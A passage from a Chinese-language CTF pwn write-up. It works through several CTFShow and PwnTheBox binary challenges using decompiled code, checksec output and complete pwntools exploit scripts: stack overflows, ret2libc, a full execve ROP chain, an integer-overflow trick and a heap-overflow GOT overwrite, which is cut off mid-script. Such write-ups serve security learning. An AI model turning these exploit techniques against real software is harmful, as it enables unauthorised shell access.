pop_ret = 0x4004c6 # ROPgadget --binary ./1024_happy_checkin --only "pop|ret"
libcbase = puts_address - libc.dump('puts')
log.success('libcbase_address => %s', hex(libcbase))
system_address = libcbase + libc.dump('system')
info('system_address => 0x%x', system_address)
bin_sh_address = libcbase + libc.dump('str_bin_sh')
info('bin_sh_address => 0x%x', bin_sh_address)
payload = b'a'*0x370 + b'pwn1024!' + p64(pop_ret) + p64(pop_rdi) + p64(bin_sh_address) + p64(system_address)
io.sendline(payload)
io.interactive()
```

![](https://paper.tanyaodan.com/CTFShow/1024_happy_checkin/4.png)

------

### 烧烤摊儿

先`file ./shaokao`查看文件类型再`checksec --file=./shaokao`检查文件保护情况。

```bash
┌──(tyd㉿kali-linux)-[~/ctf]
└─$ file ./shaokao                         
./shaokao: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, BuildID[sha1]=2867805c3d477c70c169e3106f70255b7b4e8ffa, for GNU/Linux 3.2.0, not stripped
                                                                   
┌──(tyd㉿kali-linux)-[~/ctf]
└─$ checksec --file=./shaokao
[*] '/home/tyd/ctf/shaokao'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

使用`IDA pro 64bit`打开附件`shaokao`，按`F5`反汇编源码并查看主函数。

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v3; // edx
  int v4; // ecx
  int v5; // er8
  int v6; // er9
  int result; // eax
  unsigned int v8; // [rsp+Ch] [rbp-4h]

  welcome(argc, argv, envp);
  v8 = menu();
  if ( v8 <= 5 )
    __asm { jmp     rax }
  printf((unsigned int)&unk_4B7008, (_DWORD)argv, v3, v4, v5, v6);
  exit(0LL);
  return result;
}
```

先来分析`menu()`函数。

```c
__int64 __fastcall menu(__int64 a1, __int64 a2, int a3, int a4, int a5, int a6)
{
  int v6; // edx
  int v7; // ecx
  int v8; // er8
  int v9; // er9
  unsigned int v11; // [rsp+Ch] [rbp-4h] BYREF

  printf((unsigned int)&unk_4B7040, (unsigned int)&name, a3, a4, a5, a6);  // 欢迎来到大金烧烤摊儿，来点啥？
  puts(&unk_4B706B);  // 1.啤酒
  puts(&unk_4B7075);  // 2.烤串
  puts(&unk_4B707F);  // 3.钱包余额
  puts(&unk_4B708F);  // 4.承包摊位
  if ( own )
    puts(&unk_4B709F);  // 5.改名
  puts(&unk_4B70A9);  // 0.离开
  putchar(62LL);
  putchar(32LL);
  _isoc99_scanf((unsigned int)&unk_4B70B3, (unsigned int)&v11, v6, v7, v8, v9);
  return v11;
}
```

接着分析`pijiu()`函数，发现判断语句`if(10 * v9 >= money)`存在整数溢出漏洞，我们可以通过输入一个负数来进入`else`实现`money`的增加。`chuan()`函数也存在这个整数溢出漏洞，但是加的钱没`pijiu()`函数加的多。

```c
__int64 pijiu()
{
  int v0; // edx
  int v1; // ecx
  int v2; // er8
  int v3; // er9
  int v4; // edx
  int v5; // ecx
  int v6; // er8
  int v7; // er9
  int v9; // [rsp+8h] [rbp-8h] BYREF
  int v10; // [rsp+Ch] [rbp-4h] BYREF

  v10 = 1;
  v9 = 1;
  puts(&unk_4B70B6);   // 1.青岛啤酒
  puts(&unk_4B70C6);   // 2.燕京U8
  puts(&unk_4B70D2);   // 3.勇闯天涯
  _isoc99_scanf((unsigned int)&unk_4B70B3, (unsigned int)&v10, v0, v1, v2, v3);
  puts(&unk_4B70E2);   // 来几瓶？
  _isoc99_scanf((unsigned int)&unk_4B70B3, (unsigned int)&v9, v4, v5, v6, v7);
  if ( 10 * v9 >= money )
    puts(&unk_4B70EF);  // 诶哟，钱不够了
  else
    money += -10 * v9;
  puts(&unk_4B7105);   // 咕噜咕噜...
  return 0LL;
}
```

分析`vip()`函数，可以看到当变量`money`的值大于`100000`时，变量`own`会置为`1`，此时我们就拥有烧烤摊啦。

```c
__int64 vip()
{
  puts(&unk_4B7180);  // 老板，你这摊儿，我买了
  if ( money <= 100000 )
  {
    puts(&unk_4B71A9);  // 没钱别瞎捣乱
  }
  else
  {
    money -= 100000;
    own = 1;
    puts(&unk_4B71A2);  // 成交
  }
  return 0LL;
}
```

拥有烧烤摊后，我们可以输入`5`对烧烤摊进行改名，分析`gaiming()`函数，`scanf()`函数并不能对输入长度进行限制，显然存在栈溢出漏洞，我们只需要用`0x28`个字节即可覆盖到栈帧。

```c
__int64 gaiming()
{
  int v0; // edx
  int v1; // ecx
  int v2; // er8
  int v3; // er9
  char v5[32]; // [rsp+0h] [rbp-20h] BYREF

  puts(&unk_4B71C0);  // 烧烤摊儿已归你所有，请赐名：
  _isoc99_scanf((unsigned int)&unk_4B71EB, (unsigned int)v5, v0, v1, v2, v3);
  j_strcpy_ifunc(&name, v5);
  return 0LL;
}
```

构造ROP链时，我们可以借助工具来生成ROP链。

```bash
ROPgadget --binary ./shaokao --ropchain
```

编写`Python`代码求解，获得`shell`后输入`cat flag`得到`ctfshow{739bccb2-d1ce-4d0c-b16b-5e5e953b6ed0}`。

```python
from pwn import *

context(arch='amd64', os='linux', log_level='debug')
io = remote('pwn.challenge.ctf.show', 28103)
io.sendlineafter('>', b'1')
sleep(1)
io.sendline(b'1')
sleep(1)
io.sendline(b'-10000')
io.sendlineafter('>', b'4')
io.sendlineafter('>', b'5')
# ROPgadget --binary ./shaokao --ropchain
p = b''
p += p64(0x000000000040a67e) # pop rsi ; ret
p += p64(0x00000000004e60e0) # @ .data
p += p64(0x0000000000458827) # pop rax ; ret
p += b'/bin//sh'
p += p64(0x000000000045af95) # mov qword ptr [rsi], rax ; ret
p += p64(0x000000000040a67e) # pop rsi ; ret
p += p64(0x00000000004e60e8) # @ .data + 8
p += p64(0x0000000000447339) # xor rax, rax ; ret
p += p64(0x000000000045af95) # mov qword ptr [rsi], rax ; ret
p += p64(0x000000000040264f) # pop rdi ; ret
p += p64(0x00000000004e60e0) # @ .data
p += p64(0x000000000040a67e) # pop rsi ; ret
p += p64(0x00000000004e60e8) # @ .data + 8
p += p64(0x00000000004a404b) # pop rdx ; pop rbx ; ret
p += p64(0x00000000004e60e8) # @ .data + 8
p += p64(0x4141414141414141) # padding
p += p64(0x0000000000447339) # xor rax, rax ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000496710) # add rax, 1 ; ret
p += p64(0x0000000000402404) # syscall

payload = b'a'*0x28+p
io.sendline(payload)
io.interactive()
```

------

## PwnTheBox

### [others shellcode](https://ce.pwnthebox.com/challenges?id=476)

先`file ./wustctf2020_number_game  `查看文件类型，再`checksec --file=./wustctf2020_number_game  `检查一下文件保护情况。

```bash
┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnthebox]
└─$ file ./shell_asm                                                                         
./shell_asm: ELF 32-bit LSB pie executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=c1e8d8e26946c6b08794abdad991e3909e1bdc7f, not stripped
                                                                                                    
┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnthebox]
└─$ checksec --file=./shell_asm                                                    
[*] '/home/tyd/ctf/pwn/pwnthebox/shell_asm'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

使用`IDA pro 32bit`打开附件`wustctf2020_number_game`，按`F5`反汇编源码并查看主函数。

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  getShell();
  return 0;
}
```

双击`getShell()`函数查看详情：

```c
int getShell()
{
  int result; // eax
  char v1[9]; // [esp-Ch] [ebp-Ch] BYREF

  strcpy(v1, "/bin//sh");
  result = 11;
  __asm { int     80h; LINUX - sys_execve }
  return result;
}
```

直接`nc redirect.do-not-trust.hacking.run 10131`进靶机，`cat flag`拿到`PTB{4dc758b3-31e2-434d-af1a-bfc082c51671}`。当然也可以用`pwntools`练习，编写`Python`脚本连接`redirect.do-not-trust.hacking.run`的监听端口`10131`，发送`payload`即可得到`PTB{4dc758b3-31e2-434d-af1a-bfc082c51671}`，提交即可。

```python
from pwn import *

io = remote('redirect.do-not-trust.hacking.run', 10131)
io.sendline(b'cat flag')
io.interactive()
```

------

### [tutorial1](https://ce.pwnthebox.com/challenges?type=4&id=948)

先`file ./tutorial1`查看文件类型再`checksec --file=./tutorial1`检查了一下文件保护情况。

使用`IDA pro 64bit`打开附件`tutorial1`，按`F5`反汇编源码并查看主函数。

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int buf; // [rsp+0h] [rbp-10h] BYREF
  unsigned __int64 v5; // [rsp+8h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  setbuf(stdin, 0LL);
  setbuf(stdout, 0LL);
  puts("   _  __       ____  _       __ ");
  puts("  | |/ /____  / __ \\(_)___  / /_");
  puts("  |   // __ \\/ / / / / __ \\/ __/");
  puts("  /   |/ /_/ / /_/ / / / / / /_ ");
  puts(" /_/|_/ .___/\\____/_/_/ /_/\\__/  ");
  puts("     /_/                         ");
  puts("Welcome, freshman!");
  puts("This is your first pwn challenge, right?");
  puts("Try to get into backdoor!");
  puts("Tell me your secret number:");
  read(0, &buf, 4uLL);
  if ( buf == -1162167622 ) // 0BABABABAh
    backdoor();
  else
    puts("Well, you don't know the trick yet?");
  return 0;
}
```

当用户输入的`buf`变量为`0xbabababa`时会执行`backdoor()`函数，双击`backdoor()`函数查看详情，可以看到函数返回值直接是`system("/bin/sh")`。

```c
int backdoor()
{
  puts("Well done! Go get your flag!");
  return system("/bin/sh");
}
```

编写`Python`代码获取靶机的`shell`权限，`cat flag`拿到本题`flag`，提交`PTB{073e2a21-2013-44e8-992b-549d973b333c}`即可。

```python
from pwn import *

context(arch='amd64', os='linux', log_level='debug')
io = remote('redirect.do-not-trust.hacking.run', 10134)
io.sendlineafter(b':', p64(0xbabababa))
io.interactive()
```

![](https://paper.tanyaodan.com/PwnTheBox/948/1.png)

------

### [tutorial2](https://ce.pwnthebox.com/challenges?type=4&id=949)

先`file ./tutorial2`查看文件类型再`checksec --file=./tutorial2`检查了一下文件保护情况。

使用`IDA pro 64bit`打开附件`tutorial2`，按`F5`反汇编源码并查看主函数。

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  void (*v4)(void); // [rsp+8h] [rbp-18h] BYREF
  int buf; // [rsp+10h] [rbp-10h] BYREF
  unsigned __int64 v6; // [rsp+18h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  setbuf(stdin, 0LL);
  setbuf(stdout, 0LL);
  puts("'##::::'##:'########::::'#####:::'####:'##::: ##:'########:");
  puts(". ##::'##:: ##.... ##::'##.. ##::. ##:: ###:: ##:... ##..::");
  puts(":. ##'##::: ##:::: ##:'##:::: ##:: ##:: ####: ##:::: ##::::");
  puts("::. ###:::: ########:: ##:::: ##:: ##:: ## ## ##:::: ##::::");
  puts(":: ## ##::: ##.....::: ##:::: ##:: ##:: ##. ####:::: ##::::");
  puts(": ##:. ##:: ##::::::::. ##:: ##::: ##:: ##:. ###:::: ##::::");
  puts(" ##:::. ##: ##:::::::::. #####:::'####: ##::. ##:::: ##::::");
  puts("..:::::..::..:::::::::::.....::::....::..::::..:::::..:::::");
  puts("Let's try something cooler!");
  puts("Tell me your secret number again:");
  read(0, &buf, 4uLL);
  if ( buf == -559038737 )  //0DEADBEEFh
  {
    puts("Oh, where to go?");
    read(0, &v4, 4uLL);
    v4();
  }
  else
  {
    puts("Well, you don't know the trick yet?");
  }
  return 0;
}
```

当用户输入的`buf`变量为`0xdeadbeef`时会输出`where to go?`语句，并执行用户输入的地址所存放的函数。在`Functions window`中有一个起始地址为`0x4006E6`的`backdoor()`函数，双击`backdoor()`函数查看详情，可以看到函数返回值直接是`system("/bin/sh")`。

```c
int backdoor()
{
  puts("Well done! Go get your flag!");
  return system("/bin/sh");
}
```

编写`Python`代码获取靶机的`shell`权限，`cat flag`拿到本题`flag`，提交`PTB{ede6ccfd-7923-41a1-8f6c-3066b1ba1bb2}`即可。

```python
from pwn import *

context(arch='amd64', os='linux', log_level='debug')
io = remote('redirect.do-not-trust.hacking.run', 10133)
e = ELF('./tutorial2')
io.recvuntil(':')
io.send(p32(0xdeadbeef))
backdoor = e.symbols['backdoor'] # 0x4006e6
io.recvuntil('?')
io.send(p64(backdoor))
io.interactive()
```

![](https://paper.tanyaodan.com/PwnTheBox/949/1.png)

------

### [pwn1](https://ce.pwnthebox.com/challenges?type=4&id=365)

先`file ./pwn1_sctf_2016`查看文件类型再`checksec --file=pwn1_sctf_2016`检查一下文件保护情况。

![](https://paper.tanyaodan.com/BUUCTF/pwn1_sctf_2016/1.png)

用`IDA Pro 32bit`打开`pwn1_sctf_2016`后按`F5`反汇编源码并查看主函数，发现`vuln()`函数。

![](https://paper.tanyaodan.com/BUUCTF/pwn1_sctf_2016/2.png)

双击`vuln()`函数查看源码，分析后发现`fgets()`函数限制输入`32`个字节到变量`s`中，乍一看并没有超出可用栈大小。但是审计代码时会发现第`19`行的`replace()`函数会把输入的`I`替换成`you`，`1`个字符变成`3`个字符，并且在第`27`行会对原来的`s`变量重新赋值。

![](https://paper.tanyaodan.com/BUUCTF/pwn1_sctf_2016/4.png)

在`Functions window`可以看到有一个`get_flag()`函数，按`F5`反汇编可以看到这是一个系统调用，且`get_flag()`函数的起始地址为`0x8048F0D`。

![](https://paper.tanyaodan.com/BUUCTF/pwn1_sctf_2016/5.png)

查看栈结构发现`s`的长度为`0x3c`，即`60`个字节，而输入被限制在`32`个字节内，每个`I`可以被替换成`you`，所以输入`60÷3=20`个`I`就能让栈溢出，然后`db 4 dup(?)` 还需要占用`4`个字节的内存，最后加上`get_flag()`函数的起始地址`0x8048F0D`构成`payload`。

![](https://paper.tanyaodan.com/BUUCTF/pwn1_sctf_2016/6.png)

编写`Python`脚本连接`redirect.do-not-trust.hacking.run`的监听端口`10356`，发送`payload`即可得到`PTB{9ecbaa04-d23f-4d99-a1e0-6b9d8f6a5211}`。

```python
from pwn import *

io = remote('redirect.do-not-trust.hacking.run', 10356)
e = ELF('pwn1_sctf_2016')
address = e.symbols['get_flag']
log.success('get_flag_address => %s' % hex(address).upper())
payload = b'I'*20 + b'a'*0x4 + p32(address)
# payload = b'I'*20 + b'a'*0x4 + p32(0x8048F0D)
io.sendline(payload)
io.interactive()
```

------

### [getshell](https://ce.pwnthebox.com/challenges?type=4&id=1773)

先`file ./wustctf2020_getshell`查看文件类型再`checksec --file=./wustctf2020_getshell`检查了一下文件保护情况。

使用`IDA pro 32bit`打开附件`wustctf2020_getshell`，按`F5`反汇编源码并查看主函数。

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  init();
  vulnerable();
  return 0;
}
```

双击`vulnerable()`函数查看详情，发现有个`char`型数组变量`buf`，`buf`的长度只有`0x18`，但是`gets()`函数读取输入到变量`buf`时限制输入的大小是`0x20`，显然存在栈溢出漏洞。

```c
ssize_t vulnerable()
{
  char buf[24]; // [esp+0h] [ebp-18h] BYREF

  return read(0, buf, 0x20u);
}
```

此外在`Functions window`中还能看到`shell`函数，起始地址为`0x804851B`，查看`shell`函数发现返回值直接是`system("/bin/sh")`。

```c
int shell()
{
  return system("/bin/sh");
}
```

构造`Payload`时先用`0x18`个字节占满`buf`变量，再用`4`个字节覆盖到栈帧，接着再加上`shell`函数的地址以调用靶机的`shell`脚本。

编写`Python`代码获取靶机的`shell`权限，`cat flag`拿到本题`flag`，提交`PTB{c0d1c12f-9600-4e2a-a12b-426ba9e63083}`即可。

```python
from pwn import *

context(arch='i386', os='linux', log_level='debug')
io = remote('redirect.do-not-trust.hacking.run', 10267)
e = ELF('./wustctf2020_getshell')
shell = e.symbols['shell'] # 0x804851B
log.success('shell_address => %s'%hex(shell))
payload = b'a'*0x18 + b'pwn!' + p32(shell)
io.sendline(payload)
io.interactive()
```

![](https://paper.tanyaodan.com/PwnTheBox/1773/1.png)

------

### [getshell2](https://ce.pwnthebox.com/challenges?id=1775)

先`file ./wustctf2020_getshell_2`查看文件类型再`checksec --file=./wustctf2020_getshell_2`检查了一下文件保护情况。

```bash
┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnthebox]
└─$ file ./wustctf2020_getshell_2
./wustctf2020_getshell_2: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=04705198080d6fab73e387726630da78421bd6d0, not stripped

┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnthebox]
└─$ checksec --file=./wustctf2020_getshell_2
[*] '/home/tyd/ctf/pwn/pwnthebox/wustctf2020_getshell_2'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

使用`IDA pro 32bit`打开附件`wustctf2020_getshell_2`，按`F5`反汇编源码并查看主函数。

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  init();
  vulnerable();
  return 0;
}
```

双击`vulnerable()`函数查看详情，发现有个`char`型数组变量`buf`，`buf`的长度只有`0x18`，但是`gets()`函数读取输入到变量`buf`时限制输入的大小是`0x24`，显然存在栈溢出漏洞。

```c
ssize_t vulnerable()
{
  char buf[24]; // [esp+0h] [ebp-18h] BYREF

  return read(0, buf, 0x24u);
}
```

和上题 [getshell](#getshell) 不同的是，`Functions window`中的`shell`函数并不能直接用了。

```c
int shell()
{
  return system("/bbbbbbbbin_what_the_f?ck__--??/sh");
}
```

我们可以选取有用的信息，在`shell`函数的汇编代码中可以看到`call _system`的地址为`0x8048529`。

```assembly
.text:0804851B                 public shell
.text:0804851B shell           proc near
.text:0804851B ; __unwind {
.text:0804851B                 push    ebp
.text:0804851C                 mov     ebp, esp
.text:0804851E                 sub     esp, 8
.text:08048521                 sub     esp, 0Ch
.text:08048524                 push    offset command  ; "/bbbbbbbbin_what_the_f?ck__--??/sh"
.text:08048529                 call    _system
.text:0804852E                 add     esp, 10h
.text:08048531                 nop
.text:08048532                 leave
.text:08048533                 retn
.text:08048533 ; } // starts at 804851B
.text:08048533 shell           endp
```

使用`ROPgadget`能获取到字符串`"sh"`的地址为`0x8048670`。

```bash
┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnthebox]
└─$ ROPgadget --binary ./wustctf2020_getshell_2 --string "sh"
Strings information
============================================================
0x08048670 : sh
```

编写`Python`代码求解得到`PTB{1adb36f3-5905-4ed4-8b05-52a0affd97a5}`。

```python
from pwn import *

context(arch='i386', os='linux', log_level='debug')
io = remote('redirect.do-not-trust.hacking.run', 10256)
elf = ELF('./wustctf2020_getshell_2')
call_system = 0x8048529
sh_addr = 0x8048670
payload = b'a'*(0x18+0x4) + p32(call_system) + p32(sh_addr)
io.sendline(payload)
io.interactive()
```

------

### [ciscn_2019_n_1](https://ce.pwnthebox.com/challenges?type=4&id=524)

先`file ./ciscn_2019_n_1`查看文件类型再`checksec --file=ciscn_2019_n_1`检查一下文件保护情况。

![](https://paper.tanyaodan.com/BUUCTF/ciscn_2019_n_1/1.png)

用`IDA Pro 64bit`打开`ciscn_2019_n_1`后按`F5`反汇编源码并查看主函数，发现`fun()`函数最可疑。

![](https://paper.tanyaodan.com/BUUCTF/ciscn_2019_n_1/2.png)

双击`func()`函数查看源码可以看到当`v2 = 11.28125`时会有一个系统调用。

![](https://paper.tanyaodan.com/BUUCTF/ciscn_2019_n_1/3.png)

查看汇编代码双击`cs:dword_4007F4`可以看到`11.28125`在内存中的`16`进制表示为`0x41348000`。

![](https://paper.tanyaodan.com/BUUCTF/ciscn_2019_n_1/4.png)

查看栈结构，此处`var_30`是`v1`，而`var_4`是`v2`，需要`(0x30-0x04)=44`个字节就能让栈溢出，最后再填入`11.28125`对应的十六进制数`0x41348000`。

![](https://paper.tanyaodan.com/BUUCTF/ciscn_2019_n_1/5.png)

编写`Python`脚本连接`redirect.do-not-trust.hacking.run`的监听端口`10406`，发送`payload`即可得到`PTB{7a857dc1-60e5-41a8-b615-3dd418407a0a}`。

```python
from pwn import *

io = remote('redirect.do-not-trust.hacking.run', 10406)
payload = b'a'*(0x30 - 0x4) + p64(0x41348000)
io.sendline(payload)
io.interactive()
```

![](https://paper.tanyaodan.com/PwnTheBox/524/1.png)

------

### [Easyheap](https://ce.pwnthebox.com/challenges?type=4&id=1387)

先`file ./easyheap `查看文件类型，再`checksec --file=./easyheap `检查一下文件保护情况。

```bash
┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnthebox]
└─$ file ./easyheap            
./easyheap: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=474c468173fd4e4bf36f20820d6fc2c3b5abed7a, not stripped

┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnthebox]
└─$ checksec --file=./easyheap 
[*] '/home/tyd/ctf/pwn/pwnthebox/easyheap'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

用`IDA Pro 64bit`打开`easyheap`后按`F5`反汇编源码并查看主函数。

```c
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  int v3; // eax
  char buf[8]; // [rsp+0h] [rbp-10h] BYREF
  unsigned __int64 v5; // [rsp+8h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 2, 0LL);
  while ( 1 )
  {
    while ( 1 )
    {
      menu();
      read(0, buf, 8uLL);
      v3 = atoi(buf);
      if ( v3 != 3 )
        break;
      delete_heap();
    }
    if ( v3 > 3 )
    {
      if ( v3 == 4 )
        exit(0);
      if ( v3 == 4869 )
      {
        if ( (unsigned __int64)magic <= 0x1305 )
        {
          puts("So sad !");
        }
        else
        {
          puts("Congrt !");
          l33t();
        }
      }
      else
      {
LABEL_17:
        puts("Invalid Choice");
      }
    }
    else if ( v3 == 1 )
    {
      create_heap();
    }
    else
    {
      if ( v3 != 2 )
        goto LABEL_17;
      edit_heap();
    }
  }
}
```

双击`menu()`函数查看详情，发现该程序的功能如下：`1`创建堆，`2`修改堆，`3`删除堆。

```c
int menu()
{
  puts("--------------------------------");
  puts("       Easy Heap Creator       ");
  puts("--------------------------------");
  puts(" 1. Create a Heap               ");
  puts(" 2. Edit a Heap                 ");
  puts(" 3. Delete a Heap               ");
  puts(" 4. Exit                        ");
  puts("--------------------------------");
  return printf("Your choice :");
}
```

双击`create_heap()`函数查看详情，发现最多创建`10`个`chunk`，`heaparray[i]`用来存放`chunk`的地址，`heaparray`是存放在`.bss`段上的，`read_input(heaparray[i], size);`用来向`chunk`中写入`size`大小的内容。

```c
unsigned __int64 create_heap()
{
  int i; // [rsp+4h] [rbp-1Ch]
  size_t size; // [rsp+8h] [rbp-18h]
  char buf[8]; // [rsp+10h] [rbp-10h] BYREF
  unsigned __int64 v4; // [rsp+18h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  for ( i = 0; i <= 9; ++i )
  {
    if ( !*(&heaparray + i) )    // if(!heaparray[i])
    {
      printf("Size of Heap : ");
      read(0, buf, 8uLL);
      size = atoi(buf);
      *(&heaparray + i) = malloc(size);
      if ( !*(&heaparray + i) )
      {
        puts("Allocate Error");
        exit(2);
      }
      printf("Content of heap:");
      read_input(*(&heaparray + i), size);  // read_input(heaparray[i], size);
      puts("SuccessFul");
      return __readfsqword(0x28u) ^ v4;
    }
  }
  return __readfsqword(0x28u) ^ v4;
}
```

双击`edit_heap()`函数查看详情，`read_input(heaparray[v1], v2);`向`chunk`中写入`v2`大小的内容，如果`v2`比`create_heap()`中创建堆时的`size`更大的话就能形成堆溢出漏洞。

```c
unsigned __int64 edit_heap()
{
  int v1; // [rsp+4h] [rbp-1Ch]
  __int64 v2; // [rsp+8h] [rbp-18h]
  char buf[8]; // [rsp+10h] [rbp-10h] BYREF
  unsigned __int64 v4; // [rsp+18h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  printf("Index :");
  read(0, buf, 4uLL);
  v1 = atoi(buf);
  if ( v1 < 0 || v1 > 9 )
  {
    puts("Out of bound!");
    _exit(0);
  }
  if ( *(&heaparray + v1) )
  {
    printf("Size of Heap : ");
    read(0, buf, 8uLL);
    v2 = atoi(buf);
    printf("Content of heap : ");
    read_input(*(&heaparray + v1), v2);  // read_input(heaparray[v1], v2); 
    puts("Done !");
  }
  else
  {
    puts("No such heap !");
  }
  return __readfsqword(0x28u) ^ v4;
}
```

双击`delete_heap()`函数查看详情，`free(heaparray[v1]);`将释放掉`heaparray[v1]`所对应的`chunk`，`heaparray[v1]=0LL;`将指针置为`0`，因此不存在`UAF`。

```c
unsigned __int64 delete_heap()
{
  int v1; // [rsp+Ch] [rbp-14h]
  char buf[8]; // [rsp+10h] [rbp-10h] BYREF
  unsigned __int64 v3; // [rsp+18h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  printf("Index :");
  read(0, buf, 4uLL);
  v1 = atoi(buf);
  if ( v1 < 0 || v1 > 9 )
  {
    puts("Out of bound!");
    _exit(0);
  }
  if ( *(&heaparray + v1) )
  {
    free(*(&heaparray + v1));   // free(heaparray[v1]);
    *(&heaparray + v1) = 0LL;   // heaparray[v1] = 0LL;
    puts("Done !");
  }
  else
  {
    puts("No such heap !");
  }
  return __readfsqword(0x28u) ^ v3;
}
```

此外，注意到`l33t()`函数能直接调用`cat /home/pwn/flag`，但是它会报错`cat: /home/pwn/flag: No such file or directory`。

```c
int l33t()
{
  return system("cat /home/pwn/flag");
}
```

如果程序开启了`PIE`保护的话，在每次加载程序时都变换加载地址，该程序`No PIE`说明未开启地址无关可执行。根据以上分析可知该程序的堆是存放在`.bss`段上的，且存在堆溢出，我们可以尝试修改`free`的`got`表，编写`Python`脚本连接`redirect.do-not-trust.hacking.run`的监听端口`10428`，发送`payload`即可得到`PTB{115d0d71-b9b7-4dcc-9df6-ced7635a87d1}`。

```python
from pwn import *

context(os='linux', arch='amd64', log_level='debug')
io = remote('redirect.do-not-trust.hacking.run', 10428)
e = ELF('./easyheap')

def create(size,content):
    io.sendlineafter(b'Your choice :', b'1')
    io.recvuntil('Size of Heap : ')
    io.sendline(str(size))
    io.recvuntil('Content of heap:')
    io.sendline(content)

def edit(index, size, content):
    io.sendlineafter(b'Your choice :', b'2')
    io.recvuntil('Index :')
    io.sendline(str(index))
    io.recvuntil('Size of Heap : ')
    io.sendline(str(size))
    io.recvuntil('Content of heap : ')
    io.sendline(content)

def delete(index):
    io.sendlineafter(b'Your choice :', b'3')
    io.recvuntil('Index :')
    io.sendline(str(index))

heaparray_creater = 0x6020E0
system_plt = e.plt['system']
free_got = e.got['free']

